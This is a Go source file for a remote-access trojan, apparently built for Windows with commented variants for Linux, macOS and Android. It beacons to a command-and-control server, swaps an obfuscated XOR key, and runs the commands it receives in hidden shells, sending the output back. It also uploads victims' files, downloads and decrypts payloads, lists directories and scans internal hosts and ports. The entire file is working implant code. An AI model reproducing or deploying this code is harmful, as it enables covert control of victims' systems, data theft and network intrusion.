/*android package lib*/
package main
import (
	"bytes"
	"math/rand"
	"io"
	"io/ioutil"
	"net/http"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"
	"mime/multipart"
	"strconv"
	"sync"
	/*linux版本忽略syscall，http版本忽略"crypto/tls"*/
	"syscall"
	// "crypto/tls"
)
var(
	/*osname string = "linux"
	osname string = "android"
	osname string = "macos"
	*/osname string = "win"
	/*选择协议protocol = "https://"*/
	protocol = "http://"
	uid string
	version string
	clientname string
	utime int8 = 30
	waitTime int = 3
	onece bool = true
	user string = "******"
	master string = "127.0.0.1:6643"
	key string = "null"
	get_headers map[string]string= map[string]string{"Accept":"q=0.7;text/html,application/xhtml+xml","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6","Upgrade-Insecure-Requests": "1","user-connid":"033344948593","User-Agent":"Mozilla/5.0 (Android 10; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0","Connection":"keep-alive",}
	post_headers map[string]string= map[string]string{"Content-Type":"application/json","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6","Cache-Control":"max-age=0","Upgrade-Insecure-Requests": "1","user-connid":"033344948593","User-Agent":"Mozilla/5.0 (Android 10; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0","Connection":"keep-alive",}
	key_part []byte = make([]byte, 0)
	partsArr    []int
    keyPartArr []int
	transport http.RoundTripper
	client *http.Client
)
func initHttpClient() {
    transport = &http.Transport{
		MaxIdleConnsPerHost:   100,
        MaxIdleConns:          100,
        IdleConnTimeout:       0,
        DisableKeepAlives:     false,
        DialContext: (&net.Dialer{
            Timeout:   30 * time.Second,
            KeepAlive: 30 * time.Second,
        }).DialContext,
		/*https
		TLSClientConfig: &tls.Config{
		     InsecureSkipVerify: true,
		},*/
    }
    client = &http.Client{
        Transport: transport,
        Timeout:   30 * time.Second,
    }
}
func getUrl(url string) string {
	var resp *http.Response
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		time.Sleep(time.Duration(waitTime) * time.Second)
		main()
		// Lib()
	}
	for key, value := range get_headers {
		req.Header.Set(key, value)
	}
	resp, err = client.Do(req)
	if err != nil {
		time.Sleep(time.Duration(waitTime) * time.Second)
		main()
		// Lib()
	}
	respBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		resp.Body.Close()
		time.Sleep(time.Duration(waitTime) * time.Second)
		main()
		// Lib()
	}
	resp.Body.Close()
	if len(respBody) == 0 {
		return ""
	}
	return strings.TrimSpace(string(respBody)) // 成功返回响应
}
func post(data map[string]string, re_url string) {
	var jsonData bytes.Buffer
	jsonData.WriteString("{")
	for key, value := range data {
		jsonData.WriteString(`"` + key + `":"` + value + `",`)
	}
	jsonStr := jsonData.String()
	if len(jsonStr) > 1 {
		jsonStr = jsonStr[:len(jsonStr)-1]
	}
	jsonStr += "}"
	req, err := http.NewRequest("POST", re_url, bytes.NewBuffer([]byte(jsonStr)))
	if err != nil {
		time.Sleep(time.Duration(waitTime) * time.Second)
		main()
		// Lib()
	}
	for key, value := range post_headers {
		req.Header.Set(key, value)
	}
	resp, err := client.Do(req)
	if err != nil {
		time.Sleep(time.Duration(waitTime) * time.Second)
		main()
		// Lib()
	}
	resp.Body.Close()
	return // 成功后退出函数
}
// 下载并解密文件
func downloadFile(cmd, re_url string) {
	if len(cmd) > 1 {
		var echo_str string
		parts := strings.Split(cmd, "^")
		url := parts[1]
		filepath := parts[2]
		if _, err := os.Stat(filepath); err == nil {
			echo_str = "allEeadyExists=====" + filepath
			data := map[string]string{
				"uid":     uid,
				"results": echo_str,
			}
			post(data, re_url)
			return
		}
		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			return
		}
		header := map[string]string{
			"User-Agent": "MyCustomDownloader/1.0",
			"Accept":     "text/plain",
		}
		for key, value := range header {
			req.Header.Set(key, value)
		}
		resp, err := client.Do(req)
		if err != nil {
			return
		}
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			return
		}
		out, err := os.Create(filepath)
		if err != nil {
			return
		}
		defer out.Close()
		err = get_encry_f(resp.Body, out)
		if err != nil {
			return
		}
		echo_str = "downloadSuccess=====" + filepath
		data := map[string]string{
			"uid":     uid,
			"results": echo_str,
		}
		post(data, re_url)
	}
}
// 上传
func getUfile(cmd string) {
    fileContent, err := get_decry_f(cmd)  // 假设这个方法返回字节流而不是文件路径
    if err != nil {
        return
    }
    var buffer bytes.Buffer
    writer := multipart.NewWriter(&buffer)
    part, err := writer.CreateFormFile("filedata", cmd)
    if err != nil {
        return
    }
    if _, err := io.Copy(part, bytes.NewReader(fileContent)); err != nil {
        return
    }
    writer.WriteField("uid", uid)
    writer.WriteField("username", user)
    writer.Close()
    url := protocol + master + "/index.php?op=uploadFile"
    req, err := http.NewRequest("POST", url, &buffer)
    if err != nil {
        return
    }
    req.Header.Set("Content-Type", writer.FormDataContentType())
    resp, err := client.Do(req)
    if err != nil {
        return
    }
    defer resp.Body.Close()
    if resp.StatusCode != http.StatusOK {
        return
    }
    time.Sleep(2 * time.Second)
}


func getCmd() {
	url := protocol + master + "/index.php?op=getMsg&uid="+uid
	re_url := protocol + master + "/index.php?op=results"
	file_url := protocol + master + "/index.php?op=putFileList"
	var job,shell string
	var msg []string
	for {
		time.Sleep(time.Duration(utime) * time.Second)
		respBody := getUrl(url)
		if strings.Contains(respBody, "00000") || respBody == "" {
			continue
		}else if respBody == "get_Back_To_Connect"{
			onece = true
			main()
			// Lib()
		}
		cmd := get_decry_s(&respBody)
		msg=strings.Split(cmd,"^")
		job=string(msg[0])
		if len(msg)>1{
			shell=string(msg[1])
		}
		switch job {
			case "getUfriends":
				scan_u_firends(cmd,"ping")
			case "getUpower":
				go Command(shell)
			case "getTime":
				getTime()
			case "getUfile":
				go getUfile(shell)
			case "loadUfile":
				go downloadFile(cmd,re_url)
			case "lookUpFile":
				listDir(shell,file_url)
			case "getHisports":
				scan_u_firends(cmd,"port")
			case "SwUVer":
				version = shell
			default:
				go get_Command(cmd,re_url)
		}
	}
}
func get_Command(cmd,re_url string) {
	result := Command(cmd)
	if result != "" {
		encry_result := get_encry_s(&result)
		data:= map[string]string{
			"uid": uid,
			"results": encry_result,
		}
		post(data, re_url)
	}
	return
}
func Command(cmd string) string {
	command := exec.Command(version, "/C", cmd)
	command.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}
	var stdout bytes.Buffer
	command.Stdout = &stdout
	command.Run()
	return stdout.String()
}
/*
linux版本
func Command(cmd string) string {
	cmdObj := exec.Command(version, "-c", cmd)
	result, err := cmdObj.CombinedOutput()
	if err != nil {
		return ""
	}
	return string(result)
}
*/
func listDir(cmd, file_url string) {
	var fileNames string
	if _, err := os.Stat(cmd); os.IsNotExist(err) {
		return
	}
	files, err := ioutil.ReadDir(cmd)
	if err != nil {
		return
	}
	for _, file := range files {
		if file.IsDir() {
			fileNames += "dir" + file.Name() + "\n"
		} else {
			fileSize := file.Size()
			fileSizeMB := float64(fileSize) / (1024 * 1024)
			fileSizeStr := strconv.FormatFloat(fileSizeMB, 'f', 2, 64)
			fileNames += "fil " + file.Name() + " (Size: " + fileSizeStr + " MB)\n"
		}
	}
	if fileNames == "" {
		fileNames = "is empty"
	}
	encryptedStr := get_encry_s(&fileNames)
	data := map[string]string{
		"uid":  uid,
		"file": encryptedStr,
	}
	post(data, file_url)
	return
}

func getTime() {
    url := protocol + master + "/index.php?op=shelltime&uid=" + uid
    respBody := getUrl(url)
    gtime := respBody
    parsedTime, _ := strconv.ParseInt(gtime, 10, 8)
    utime = int8(parsedTime)
    if t, ok := transport.(*http.Transport); ok {
        if utime >= 30 {
            t.IdleConnTimeout = 5 * time.Second  // Set IdleConnTimeout to 30 seconds
        } else {
            t.IdleConnTimeout = 0  // Reset to 0 (no idle timeout)
        }
    }
    return
}
func scan_u_firends(shell,option string) {
	var resultBuilder strings.Builder
	var wg sync.WaitGroup
	var mutex sync.Mutex
	var port_list []int
	var temp_split []string
	var open_ports,re_url string
	port_split := strings.Split(shell, "^")
	if len(port_split) < 5 {
		return
	}
	ip := port_split[1]
	choice := port_split[4]
	if strings.Contains(port_split[2], ",") {
		temp_split = strings.Split(port_split[2], ",")
	} else if strings.Contains(port_split[2], "-") {
		temp_split = strings.Split(port_split[2], "-")
		start_port, err := strconv.Atoi(temp_split[0])
		if err != nil {
			return
		}
		end_port, err := strconv.Atoi(temp_split[1])
		if err != nil {
			return
		}
		for i := start_port; i <= end_port; i++ {
			port_list = append(port_list, i)
		}
	} else {
		temp_split = append(temp_split, port_split[1])
	}
	portMap := make(map[int]bool)
	for _, v := range temp_split {
		port, err := strconv.Atoi(v)
		if err != nil {
			return
		}
		if !portMap[port] {
			port_list = append(port_list, port)
			portMap[port] = true
		}
	}
	sleep_time, err := strconv.Atoi(port_split[3])
	if err != nil {
		return
	}
	for _, port := range port_list {
		wg.Add(1)
		time.Sleep(time.Duration(sleep_time) * time.Second)
		if option == "ping"{
			if len(port_list) > 255 {
				resultBuilder.WriteString("too~many~ipNet!")
				return
			}
			target := ip + "." + strconv.Itoa(port)
			go ping(target, &wg, &resultBuilder, &mutex)
		}else if option == "port"{
			if len(port_list) > 65535{
				resultBuilder.WriteString("too~many~port!")
				return
			}
			go scan_port(ip, port, &wg, &resultBuilder, &mutex)
		}
	}
	wg.Wait()
	if option == "ping" && choice == "save" {
		open_ports = "innet^" + resultBuilder.String()
	} else if option == "port" && choice == "save" {
		open_ports = "inport^" + resultBuilder.String()
	} else if choice != "save" {
		open_ports = resultBuilder.String()
	}
	encry_data:= get_encry_s(&open_ports)
	data:= map[string]string{
		"uid": uid,
		"results": encry_data,
	}
	if choice == "save" {
		re_url = protocol + master + "/index.php?op=netResults"
	} else {
		re_url = protocol + master + "/index.php?op=results"
	}	
	post(data, re_url)
	return
}
func scan_port(ip string, port int, wg *sync.WaitGroup, resultBuilder *strings.Builder, mutex *sync.Mutex) {
	defer wg.Done()
	conn, err := net.DialTimeout("tcp", ip+":"+strconv.Itoa(port), time.Second)
	if err != nil {
		return
	}
	defer conn.Close()
	target := ip + ":[" + strconv.Itoa(port) + "]~port\n"
	mutex.Lock()
	defer mutex.Unlock()
	resultBuilder.WriteString(target)
}
func ping(ip string, wg *sync.WaitGroup, resultBuilder *strings.Builder,mutex *sync.Mutex) {
	defer wg.Done()
	var cmd string
	var ping_ver string
	var ping_pattern string
	if osname == "win" {
		ping_ver = "-n"
		ping_pattern = "TTL"
		cmd = "ping " + ping_ver + " 1 " + ip
	} else if osname == "linux" || osname == "macos" || osname == "android"{
		ping_ver = "-c"
		ping_pattern = "ttl="
		cmd = "ping " + ping_ver + " 1 " + ip
	}
	ping := Command(cmd)
	if strings.Contains(ping, ping_pattern) {
		target := "[" + ip + "]~online\n"
		mutex.Lock()
		defer mutex.Unlock()
		resultBuilder.WriteString(target)
	}
}
func getInternalIPs() string {
	var ips []string
	interfaces, _ := net.Interfaces()
	for _, iface := range interfaces {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue
		}
		addrs, _ := iface.Addrs()
		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}
			if ip != nil && ip.To4() != nil {
				ips = append(ips, ip.String())
			}
		}
	}
	return strings.Join(ips, ",")
}
func generateUUID() string {
	rand.Seed(time.Now().UnixNano())
	uuid := make([]byte, 16)
	for i := 0; i < 16; i++ {
		uuid[i] = byte(rand.Intn(256))
	}
	uuid[6] = (uuid[6] & 0x0f) | 0x40
	uuid[8] = (uuid[8] & 0x3f) | 0x80
	return byteSliceToHex(uuid[0:4]) + "-" +
		byteSliceToHex(uuid[4:6]) + "-" +
		byteSliceToHex(uuid[6:8]) + "-" +
		byteSliceToHex(uuid[8:10]) + "-" +
		byteSliceToHex(uuid[10:])
}
func byteSliceToHex(bytes []byte) string {
	hexChars := "0123456789abcdef"
	result := make([]byte, len(bytes)*2)
	for i, b := range bytes {
		result[i*2] = hexChars[b>>4]
		result[i*2+1] = hexChars[b&0x0f]
	}
	return string(result)
}
func send() {
	re_url := protocol + master + "/index.php?op=getInfo"
	currentDir, err := os.Getwd()
	currentDir = strings.ReplaceAll(currentDir, "\\", "/")
	if err != nil {
		return
	}
	add_str := clientname +"^"+ user +"^"+ osname +"^"+ strconv.Itoa(int(utime)) +"^"+ getInternalIPs() +"^"+ currentDir +"^"+ version
	encry_str := get_encry_s(&add_str)
	data:= map[string]string{"d":uid,"f":encry_str}
	post(data, re_url)
}
// 加密函数
func encryptDecrypt(input []byte) []byte {
	if len(input) == 0 {
		return nil
	}
	var result []byte
	startIndex := 0
	for i := range partsArr {
		if len(input) < keyPartArr[i%len(keyPartArr)] {
			startIndex = int(key[keyPartArr[i%len(keyPartArr)]%len(key)]) % len(key)
			break
		}
	}
	for i, b := range input {
		key_ := key[(startIndex+i)%len(key)]
		result = append(result, b^key_)
	}
	return result
}

func get_decry_f(filePath string) ([]byte, error) {
    data, err := ioutil.ReadFile(filePath)
    if err != nil {
        return nil, err
    }
    decrypted := encryptDecrypt(data)
    return decrypted, nil
}

func get_encry_f(inputFile io.Reader, outputFile *os.File) error {
	data, err := ioutil.ReadAll(inputFile) // 读取整个文件数据到字节数组
	if err != nil {
		return err
	}
	decrypted := encryptDecrypt(data)
	_, err = outputFile.Write(decrypted) // 将解密后的字节写入文件
	if err != nil {
		return err
	}
	return nil
}
func get_encry_s(input *string) string {
    keyLength := len(key)
	splitChar := (key)[keyLength-4]
	firstChar := (key)[keyLength-3]
	secondChar := (key)[keyLength-2] 
	thirdChar := (key)[keyLength-1] 
    encryptedBytes := encryptDecrypt([]byte(*input))
    var segments []string
    for _, b := range encryptedBytes {
		var chars []string
		for b >= 20 {
			chars = append(chars, string(firstChar))
			b -= 20
		}
		for b >= 10 {
			chars = append(chars, string(secondChar))
			b -= 10
		}
		if b > 0 {
			chars = append(chars, strings.Repeat(string(thirdChar), int(b)))
		}
		segments = append(segments, strings.Join(chars, ""))
	}
	return strings.Join(segments, string(splitChar))
}
func get_decry_s(input *string) string {
    keyLength := len(key)
	splitChar := (key)[keyLength-4]
	firstChar := (key)[keyLength-3]
	secondChar := (key)[keyLength-2]
	thirdChar := (key)[keyLength-1]
    segments := strings.Split(*input, string(splitChar))
    var encryptedBytes []byte
    for _, segment := range segments {
		var byteValue byte
		fCount := strings.Count(segment, string(firstChar))
		aCount := strings.Count(segment, string(secondChar))
		dotCount := strings.Count(segment, string(thirdChar))
		byteValue = byte(fCount*20 + aCount*10 + dotCount)
		encryptedBytes = append(encryptedBytes, byteValue)
	}
	decryptedBytes := encryptDecrypt(encryptedBytes)
	return string(decryptedBytes)
}
func decryptString(key string, pavi_key []int) string {
	if key != "null" {
		client_key := []byte(key)
		for j := 0; j < 30 && j < len(client_key); j++ {if client_key[j] < byte(pavi_key[0]) {client_key[j] = client_key[j] ^ byte(pavi_key[0])}}
		for j := 30; j < 60 && j < len(client_key); j++ {if client_key[j] < byte(pavi_key[1]) {client_key[j] = client_key[j] ^ byte(pavi_key[1])}}
		for j := 60; j < 90 && j < len(client_key); j++ {if client_key[j] < byte(pavi_key[2]) {client_key[j] = client_key[j] ^ byte(pavi_key[2])}}
		for j := 90; j < len(client_key); j++ {if client_key[j] < byte(pavi_key[3]) {client_key[j] = client_key[j] ^ byte(pavi_key[3])}}
		return string(client_key)
	}
	return "null"
}
func generateAndUpdateKey(url, uid string) []int {
	key_map := []int{rand.Intn(50) + 1, rand.Intn(50) + 1, rand.Intn(50) + 1, rand.Intn(50) + 1}
	respBody := getUrl(url)
	if respBody == "" {
		return nil
	}
	conn_parts := strings.Split(respBody, "-")
	if len(conn_parts) < 8 {
		time.Sleep(2 * time.Second)
		main()
		// Lib()
	}
	serverpub_key := conn_parts[:4]
	servermid := conn_parts[4:]
	for i := 0; i < len(serverpub_key); i++ {
		serverVal, _ := strconv.Atoi(serverpub_key[i])
		clientVal := key_map[i]
		exchangeVal := serverVal ^ clientVal
		key_map = append(key_map, exchangeVal)
	}
	for i := 0; i < len(servermid); i++ {
		serverVal, _ := strconv.Atoi(servermid[i])
		exchangeVal := key_map[i]
		intermediateVal := serverVal ^ exchangeVal
		key_map = append(key_map, intermediateVal)
	}
	key_url := protocol + master + "/index.php?op=switchKey&uid=" + uid + "&keyPart=" + strconv.Itoa(key_map[4]) + "-" + strconv.Itoa(key_map[5]) + "-" + strconv.Itoa(key_map[6])+ "-" + strconv.Itoa(key_map[7])
	getUrl(key_url)
	return []int{key_map[8], key_map[9], key_map[10],key_map[11]}
}

func getConn(newKey_map *[]int) {
	key = "null"
	partsArr = []int{}
	keyPartArr = []int{}
	key_part = []byte{}
	get_inUrl := protocol + master + "/index.php?op=getMsg&uid=" + uid
	get_keyUrl := protocol + master + "/index.php?op=EnKey&uid=" + uid
	for {
		time.Sleep(5 * time.Second)
		key_str := getUrl(get_keyUrl)
		key =  decryptString(key_str,*newKey_map)
		if key !="null"{
			in_p := getUrl(get_inUrl)
			if strings.Contains(in_p, "00000"){
				onece = false
				return
			}
		}
	}
}
/*android
func Lib() {
*/
func main() {
	if onece {
		initHttpClient()
		if uid == "" {uid = generateUUID()}
		if osname == "win"{version = "cmd"}else if osname == "linux" || osname == "macos"{version = "bash"}else if osname == "android"{version="/system/bin/sh"}
		clientname = strings.TrimSpace(Command("hostname"))
		post_headers["Host"] = master
		get_headers["Host"] = master
		url := protocol + master + "/index.php?op=conn&uid=" + uid + "&username=" + user + "&request=" + clientname
		newKey_map:= generateAndUpdateKey(url, uid)
		for {
			getConn(&newKey_map)
			if !onece && key != "null" {
				key_byte := []byte(key)
				for _, char := range key_byte {key_part = append(key_part, char)}
				for i := 1; i <= 128; i++ {partsArr = append(partsArr, i)}
				keyPartArr = append(keyPartArr,int(key_byte[4]), 4, int(key_byte[16]), 7, int(key_byte[28]), 15, int(key_byte[39]), 24, int(key_byte[43]), 43,int(key_byte[57]), int(key_byte[69]), 6, int(key_byte[78]), 17, int(key_byte[61]), 27, int(key_byte[53]), 38,int(key_byte[46]), 41, int(key_byte[13]))			
				send()
				getCmd()
			} else {
				continue
			}
		}
	}else{getCmd()}
	time.Sleep(2 * time.Second)
}
